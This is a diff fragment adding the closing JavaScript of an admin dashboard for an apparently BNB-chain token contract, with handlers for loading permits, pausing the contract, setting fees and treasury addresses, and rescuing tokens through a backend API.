+      // Refresh data
+      const [st, pr] = await Promise.all([a.status(), a.permits()]);
+      state.adminStatus = st;
+      state.permits = (pr.permits || []).sort((a, b) => Number(b.id) - Number(a.id));
+      state.activePullPermit = state.permits.find(x => String(x.id) === String(p.id)) || null;
+    } catch (err) {
+      state.pullError = err.message || String(err);
+    }
+
+    state.pullSubmitting = false;
+    render();
+  };
+}
+
+function bind() {
+  const $ = id => document.getElementById(id);
+  const $$ = sel => document.querySelectorAll(sel);
+
+  if ($('btn-load')) $('btn-load').onclick = handleAdminLoad;
+  if ($('btn-toggle-pause')) $('btn-toggle-pause').onclick = handleTogglePause;
+  if ($('btn-set-fee')) $('btn-set-fee').onclick = handleSetFee;
+  if ($('btn-set-treasury')) $('btn-set-treasury').onclick = handleSetTreasury;
+  if ($('btn-rescue')) $('btn-rescue').onclick = handleRescue;
+
+  $$('[data-pull-id]').forEach(el => {
+    el.onclick = () => {
+      const permitId = el.dataset.pullId;
+      const p = state.permits.find(x => String(x.id) === String(permitId));
+      if (p) {
+        state.activePullPermit = p;
+        state.pullError = '';
+        state.pullSuccess = '';
+        renderModal();
+      }
+    };
+  });
+}
+
+async function handleAdminLoad() {
+  const keyEl = document.getElementById('inp-key');
+  state.adminKey = keyEl ? keyEl.value.trim() : state.adminKey;
+  localStorage.setItem('adminKey', state.adminKey);
+
+  if (!state.adminKey) {
+    state.adminMsg = 'Please enter your admin API key.';
+    state.adminMsgKind = 'err';
+    render();
+    return;
+  }
+
+  state.adminBusy = true;
+  state.adminMsg = 'Connecting to backend…';
+  state.adminMsgKind = 'info';
+  render();
+
+  try {
+    const a = adminApi(state.adminKey);
+    const [st, pr] = await Promise.all([a.status(), a.permits()]);
+    state.adminStatus = st;
+    state.permits = (pr.permits || []).sort((a, b) => Number(b.id) - Number(a.id));
+    state.adminMsg = `Dashboard loaded successfully — ${state.permits.length} permit(s) retrieved.`;
+    state.adminMsgKind = 'ok';
+  } catch (e) {
+    state.adminMsg = e.message;
+    state.adminMsgKind = 'err';
+    state.adminStatus = null;
+  }
+
+  state.adminBusy = false;
+  render();
+}
+
+async function handleTogglePause() {
+  const newVal = !state.adminStatus.paused;
+  try {
+    const a = adminApi(state.adminKey);
+    await a.setPaused(newVal);
+    state.adminMsg = `Contract ${newVal ? 'paused' : 'unpaused'} successfully.`;
+    state.adminMsgKind = 'ok';
+    const [st, pr] = await Promise.all([a.status(), a.permits()]);
+    state.adminStatus = st;
+    state.permits = (pr.permits || []).sort((a, b) => Number(b.id) - Number(a.id));
+  } catch (e) {
+    state.adminMsg = e.message;
+    state.adminMsgKind = 'err';
+  }
+  render();
+}
+
+async function handleSetFee() {
+  const v = prompt('New fee in basis points (0–1000). E.g. 100 = 1%:', String(state.adminStatus.feeBps));
+  if (v === null) return;
+  const n = Number(v);
+  if (isNaN(n) || n < 0 || n > 1000) {
+    state.adminMsg = 'Fee must be between 0 and 1000 bps.';
+    state.adminMsgKind = 'err';
+    render();
+    return;
+  }
+  try {
+    await adminApi(state.adminKey).setFee(n);
+    state.adminMsg = `Fee set to ${n} bps (${((n / 10000) * 100).toFixed(2)}%).`;
+    state.adminMsgKind = 'ok';
+    state.adminStatus = await adminApi(state.adminKey).status();
+  } catch (e) {
+    state.adminMsg = e.message;
+    state.adminMsgKind = 'err';
+  }
+  render();
+}
+
+async function handleSetTreasury() {
+  const v = prompt('New treasury wallet address:', state.adminStatus.treasury);
+  if (!v) return;
+  if (!/^0x[a-fA-F0-9]{40}$/.test(v.trim())) {
+    state.adminMsg = 'Invalid address format.';
+    state.adminMsgKind = 'err';
+    render();
+    return;
+  }
+  try {
+    await adminApi(state.adminKey).setTreasury(v.trim());
+    state.adminMsg = `Treasury address updated to ${v.trim()}`;
+    state.adminMsgKind = 'ok';
+    state.adminStatus = await adminApi(state.adminKey).status();
+  } catch (e) {
+    state.adminMsg = e.message;
+    state.adminMsgKind = 'err';
+  }
+  render();
+}
+
+async function handleRescue() {
+  const token = prompt('Token contract address to rescue (or leave empty for native BNB):');
+  const to = prompt('Recipient wallet address:');
+  if (!to) return;
+  const amount = prompt('Amount to rescue (in human units):');
+  if (!amount) return;
+
+  try {
+    const a = adminApi(state.adminKey);
+    const r = await a.rescue({ token: token || undefined, to: to.trim(), amount });
+    state.adminMsg = `Rescue tx confirmed: ${r.txHash}`;
+    state.adminMsgKind = 'ok';
+    state.adminStatus = await adminApi(state.adminKey).status();
+  } catch (e) {
+    state.adminMsg = e.message;
+    state.adminMsgKind = 'err';
+  }
+  render();
+}
+
+// Initial render & auto-load if key is present
+render();
+if (state.adminKey) {
+  handleAdminLoad();
+}
+</script>
+</body>
+</html>
